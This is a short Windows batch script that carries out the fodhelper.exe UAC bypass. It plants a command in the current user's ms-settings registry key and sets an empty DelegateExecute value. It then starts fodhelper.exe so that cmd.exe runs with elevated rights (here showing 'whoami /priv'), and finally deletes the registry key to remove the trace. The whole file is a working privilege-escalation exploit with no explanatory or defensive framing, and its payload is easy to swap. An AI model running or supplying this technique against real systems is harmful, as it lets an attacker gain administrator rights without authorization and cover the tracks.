@echo off
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v "" /t REG_SZ /d "C:\Windows\System32\cmd.exe /k whoami /priv" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /d "" /f && start fodhelper.exe
reg delete HKCU\Software\Classes\ms-settings\shell\open\command /f /s
exit
